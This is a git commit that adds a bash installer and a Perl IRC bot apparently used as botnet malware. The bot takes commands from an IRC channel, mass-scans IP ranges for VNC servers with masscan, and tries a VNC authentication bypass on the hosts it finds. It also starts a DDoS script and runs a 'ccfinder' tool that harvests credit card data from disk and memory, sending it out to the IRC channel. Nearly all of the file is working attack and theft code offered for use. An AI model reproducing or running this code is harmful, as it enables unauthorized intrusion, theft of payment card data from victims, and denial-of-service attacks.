0204f7d00adbc10a4781404ab3bfdc1e6cf36c22
independentcod <independentt@hotmail.com>
2020-02-10 09:30:14 -0500

    Added Credit Card Module and CentOS installer

---
+++ debian-installer.sh
@@ -0,0 +1,41 @@
+#!/bin/bash
+clear;
+echo "Perl VNC ByPass AUTH IRC Bot with SSL";
+echo "Made by independent";
+echo 'https://github.com/independentcod/PerlIRCSSL_VNCbypass';
+read -p "Install required packages? Y or LEAVE BLANK + ENTER" choice
+case $choice in
+ Y) sudo apt update && sudo apt install python perl pkg-perl-tools libssl-dev masscan -y && sudo cpan -fi Net::SSLeay IO::Socket::SSL Time::HiRes Mojolicious Mojo::IRC;;  
+esac
+cp ./perlircssl.pl perlircssl.pl.bak;
+if read -p "IRC server:port? " name; then
+ sed -i~ -e "s/#defineserverhere/server => \'${name}\',/g" perlircssl.pl
+fi
+read -p "Is the IRC port listening over SSL encryption? < 1 / 0 > (1=Yes, 0=No)" ssl
+case $ssl in
+ 0) sed -i~ -e "s/#definesslhere/\$irc->tls({insecure => ${ssl}});/g" perlircssl.pl;;
+*) sed -i~ -e "s/#definesslhere/\$irc->tls({insecure => 1});/g" perlircssl.pl;;
+esac
+if read -p "Bot Nickname Base? (Bawt)" nick; then
+ sed -i~ -e "s/#definenickhere/nick => \'$nick\'.int(rand(99999)),/g" perlircssl.pl
+fi
+if read -p "Channel to join when connected? (#Hackers)" ch4n; then
+ sed -i~ -e "s/#definechanhere/my \$channel = \'$ch4n\';/g" perlircssl.pl
+ sed -i~ -e "s/#definenoticechanhere/my \$noticechan = \'@$ch4n\';/g" perlircssl.pl
+fi
+if read -p "Fork timeout in seconds? (Recommended: 10-60)" timeout; then
+ sed -i~ -e "s/#definetimeouthere/my \$forktimeout = "$timeout";/g" perlircssl.pl
+fi
+if read -p "Maximum number of forks? (Recommended: 50-2000)" m4xfork; then
+ sed -i~ -e "s/#defineforkshere/my \$maxforks = "$m4xfork";/g" perlircssl.pl
+fi
+if read -p "Define the ports numbers to scan (Recommended:5900 (You can add as many port you want, separated by a space))" ports; then
+ sed -i~ -e "s|#defineportshere|my @VNC_PORTS = qw/\'$ports\'/;|g" perlircssl.pl
+fi
+if read -p "Masscan RATE-LIMIT/Recommended: 25000" mrate; then
+ sed -i~ -e "s|--rate 2048|--rate "$mrate"|g" perlircssl.pl
+fi
+read -p "In order for bot to work you need to be operator in the channel, it also must be registered with services and YOU MUST autovoice your bots else you will not get any output in the server, ARE YOU READY TO LAUNCH THE PERL SCRIPT??? (Y or LEAVE BLANK + ENTER" choices
+case $choices in
+ Y) sudo perl perlircssl.pl &;;  
+esac
---
+++ perlircssl.pl
@@ -0,0 +1,264 @@
+use strict;
+use warnings;
+use Mojo::IRC;
+use Time::HiRes;
+use feature 'say';
+use Fcntl qw(:flock SEEK_END);
+my $filename = 'CCFinder.log';
+$|=1;
+#defineportshere
+use Mojo::IOLoop;
+#definetimeouthere
+#defineforkshere
+#definenoticechanhere
+#definechanhere
+my $irc = Mojo::IRC->new(
+ #definenickhere
+ user => 'VNCScan',
+ #defineserverhere
+ );
+#definesslhere
+$irc->on(irc_rpl_welcome => sub {
+ my($irc, $err) = @_;
+ warn 'Joined IRC server.';
+ $irc->write(join => $channel);
+ });
+$irc->on(irc_join => sub {
+ my($self, $message) = @_;
+ });
+my $misc = {};
+$irc->on(irc_privmsg => sub {
+ my($irc, $message) = @_;
+ my $msg = $message->{params}[1];
+ if ($msg =~ /@.ping/) {
+  warn 'Received PING request, sending PONG.';
+  $irc->write(notice => $noticechan => "pong");
+ }
+ if ($msg =~ /@.ccplz/) {
+  warn 'Sending CC info to IRC...';
+  $irc->write(notice => $noticechan => "[Info] Fetching CC data from Storage and Memory...");
+  system './ccfinder ~';
+  $irc->write(notice => $noticechan => "[Info] Now sending CC data in channel...");
+  open(my $fh, '<:encoding(UTF-8)', $filename);
+  while (my $row = <$fh>) {
+   Time::HiRes::sleep(10);
+   chomp $row;
+   $irc->write(notice => $noticechan => "$row\n");
+  }
+
+ }
+ if ($msg =~ /@.ddos/) {
+  system 'python ddos.py ' . "@ARGV"; 
+ }
+ if ($msg =~ /@.ddos.stop/) {
+  system 'pkill python'; 
+ }
+ elsif ($msg =~ /@.stopexploit/) {
+  warn 'stopexploit called, killing...';
+  if ( exists $misc->{exploitpid} )  {
+   $irc->write(notice => $noticechan => '[Info] Sending SIGTERM to PID ' . $misc->{exploitpid});
+   kill 'INT', $misc->{exploitpid};kill 'TERM', $misc->{exploitpid};
+   delete $misc->{exploitpid};
+   $irc->write(notice => $noticechan => '[Info] PID ' . $misc->{exploitpid} . " killed, !exploit stopped");
+   } else {
+    $irc->write(notice => $noticechan => "exploit is not running");
+   }
+  }
+  return unless $msg =~ /^\@./;
+  my $subprocess = Mojo::IOLoop->subprocess(
+   sub {
+    my $s = shift;
+    my @IRC_RESULTS;
+    if ($msg =~ /@.scan ([^\s]+)/) {
+     $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
+     my $range = $1;
+     my $masscancmd = "masscan -p 5900 --range $range --rate 25000 --open --banners -oG hosts.txt ";
+     warn "Received rangescan request on $range , running masscan...";
+     my $r = `$masscancmd`;
+     push @IRC_RESULTS, $_ foreach split "\n", $r;
+     } elsif ($msg =~ /@.exploit/) {
+      warn 'Received exploitrun request, exploiting hosts.txt...';
+      my $r = exploitrun ("vnc", $s, $s->pid);
+
+      } elsif ($msg =~ /@.format/) {
+       warn 'Received file formatting request, processing...';    
+       my $formatcmd = "rm -rf ips.txt && cat hosts.txt | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' >>ips.txt";
+       my $r = `$formatcmd`;
+       push @IRC_RESULTS, $_ foreach split "\n", $r;
+      }
+      return @IRC_RESULTS;
+      }, sub {
+       my ($s, $error, @res) = @_;
+       $irc->write(notice => $noticechan => " FINISHED: $msg");
+       warn "Finished work: $msg";
+       if ( $error ) {
+        warn "ERROR FOUND: $error";
+        $irc->write(notice => $noticechan => "ERROR: " . $error);
+        return;
+       }
+       $irc->write(notice => $noticechan => $_) foreach @res;
+       });
+
+  $subprocess->on(progress => sub {
+   my ($subprocess, @data) = @_;
+   $irc->write(notice => $noticechan => $_) foreach @data; # this prints the data from subprocesses
+   });
+  $subprocess->on(spawn => sub {
+   my $subprocess = shift;
+   my $pid = $subprocess->pid;
+   # $irc->write(notice => $noticechan =>  "Performing work in process $pid");
+   if ( $msg =~ /@.exploit/ ) {
+    $irc->write(notice => $noticechan => 'pid: ' . $pid) ;
+    $misc->{exploitpid} = $pid ;
+   }
+   });
+  });
+   $irc->connect(sub {
+    my($irc, $err) = @_;
+    return warn $err if $err;
+    $irc->write(join => $channel);
+    });
+   Mojo::IOLoop->start;
+
+   sub exploitvnc {
+    my $row = shift;
+    my $subp = shift;
+    my $ownpid = shift;
+    my $arg = shift;
+    foreach my $vncport (@VNC_PORTS){
+     my $sock = IO::Socket::INET->new(PeerAddr => $row, PeerPort => $vncport, Proto => 'tcp', Timeout => 10);
+     next unless $sock;
+     $sock->read(my $proto_ver, 12);
+     eval { 
+      print $sock $proto_ver;
+      $sock->read(my $sec_types, 1);
+      $sock->read(my $ignored, unpack('C', $sec_types));
+      print $sock "\x01";
+      $sock->read(my $auth_type, 4);
+      print $sock "\x01"; 
+     };
+     my $ver = "RFB 003.008";
+     $sock->read(my $vnc_data, 4);
+     if (unpack('I', $vnc_data)) {
+      if ($proto_ver =~ $ver) {
+       $proto_ver =~ s/[\r\n]+//g;
+       if (index($vnc_data, chr(4)) != -1) {
+
+        $subp->progress(" $row:$vncport $vnc_data ");
+       }
+       elsif (index($vnc_data, chr(195)) != -1) {
+
+        $subp->progress(" $row:$vncport $vnc_data ");
+       }
+       elsif (index($vnc_data, chr(208)) != -1) {
+
+        $subp->progress(" $row:$vncport $vnc_data ");
+       }
+       elsif (index($vnc_data, chr(88)) != -1) {
+
+        $subp->progress(" $row:$vncport $vnc_data ");
+       }
+       elsif (index($vnc_data, chr(87)) != -1) {
+
+        $subp->progress(" $row:$vncport $vnc_data ");
+       }
+       elsif (index($vnc_data, chr(7)) != -1) {
+
+        $subp->progress(" $row:$vncport $vnc_data ");
+       }
+      }
+     }
+    }
+    exit; 
+   }
+
+   sub exploitrun {
+    my $arg = shift;
+    my $subp = shift;
+    my $ownpid = shift;
+    $SIG{CHLD} = 'IGNORE';
+    $subp->progress("[Info] Starting $arg Exploiter ");
+    my @ips;
+    my %ips;
+    my $filename = 'ips.txt';
+    if (open(my $fh, '<:encoding(UTF-8)', $filename)) {
+     while (my $row = <$fh>) {
+      chomp $row;
+      $row = $1 if $row =~ /(\d+\.\d+\.\d+\.\d+)/;
+      #push @ips, $row;
+      $ips{$row} = '';
+     }
+     close $fh;
+    }
+    push @ips, $_ foreach (sort {$a cmp $b} keys %ips);
+    my %pids;
+    $subp->progress("Calling IPs (" . int (scalar @ips) . ")");
+
+    my $finished = 0;
+    my $i = 0;
+    while ( @ips > 0 )
+    {
+     Time::HiRes::sleep(0.1);
+     #$subp->progress("[Info] In progress");
+     foreach (keys %pids){
+      my $exists = kill 0, $_; # kill 'TERM', $_ 
+      if ( $exists ) {
+       kill 'TERM', $_ if $pids{$_} < CORE::time;
+       } else {
+        delete $pids{$_}
+       }
+      }
+      if ( scalar keys %pids >= $maxforks )
+      {
+       say int scalar @ips;
+       say 'pids: ' . scalar keys %pids;
+       } else {
+        my $targetip = shift @ips;
+        say 'Sending ' . $targetip;
+        my $pid;
+        if ($pid = fork) {
+         say $pid;
+         } else {
+          if ($arg =~ /rdp/) {
+           exploitrdp($targetip, $subp, $ownpid);
+          }
+          if ($arg =~ /ssh/) {
+           exploitssh($targetip, $subp, $ownpid);
+          }
+          if ($arg =~ /mysql/) {
+           exploitmysql($targetip, $subp, $ownpid);
+          }
+          if ($arg =~ /smtp/) {
+           exploitsmtp($targetip, $subp, $ownpid);
+          }
+          if ($arg =~ /vnc/) {
+           exploitvnc($targetip, $subp, $ownpid);
+          }
+         }
+         $pids{$pid} = CORE::time + $forktimeout;
+        }
+       }
+       $subp->progress("Done Calling IPs");
+       while ( scalar keys %pids > 0 ) # wait for last alive forks to terminate
+       {
+        Time::HiRes::sleep(0.1);
+        foreach (keys %pids){
+         my $exists = kill 0, $_; # kill 'TERM', $_ 
+         if ( $exists ) {
+
+          kill 'TERM', $_ if $pids{$_} < CORE::time;
+          } else {
+           delete $pids{$_}
+          }
+         }
+        }
+        $subp->progress("[Info] $arg Done Scan");
+       }
+       sub lockf {
+        my ($fh) = @_;
+        flock($fh, LOCK_EX) or die "Cannot lock - $!\n";
+       }
+       sub unlock {
+        my ($fh) = @_;
+        flock($fh, LOCK_UN) or die "Cannot unlock - $!\n";
+       }
